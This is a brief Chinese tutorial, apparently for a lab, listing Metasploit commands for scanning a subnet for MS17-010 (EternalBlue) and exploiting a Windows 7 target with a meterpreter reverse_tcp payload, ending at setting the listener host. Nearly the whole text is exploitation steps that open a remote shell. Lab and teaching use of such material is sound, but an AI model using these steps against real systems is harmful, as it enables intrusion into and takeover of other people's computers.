# 利用永恒之蓝漏洞实施对win7的攻击





-   查看主机以及肉鸡的IP地址并能ping通
    -   得到主机的IP地址为192.168.107.130 肉鸡的IP地址为192.168.107.131
-   查看数据库状态service postgresql status
    -   如果没有打开则启动数据库service postgresql start
    -   再次查看状态 active即可
-   msfdb初始化数据库: msfdb init 需要使用root权限
-   启动msfconsole
    -   查看数据库状态db_status
-   搜索ms17_010(永恒之蓝漏洞): search ms17_010
-   进行漏洞扫描use auxiliary/scanner/smb/smb_ms17_010
    -   查看需要的命令使用options获取帮助
-   设置扫描的主机或者主机段
    -   设置靶机 set rhosts 肉鸡IP/24
    -   设置线程 set threads 线程数
-   打开wireshark抓包工具监听eth0 run
-   设置用什么进行攻击 use exploit/windows/smb/ms17_010_eternalblue
-   设置攻击载荷 set payload windows/x64/meterpreter/reverse_tcp
-   设置监听主机 lhost: set lhost 主机IP地址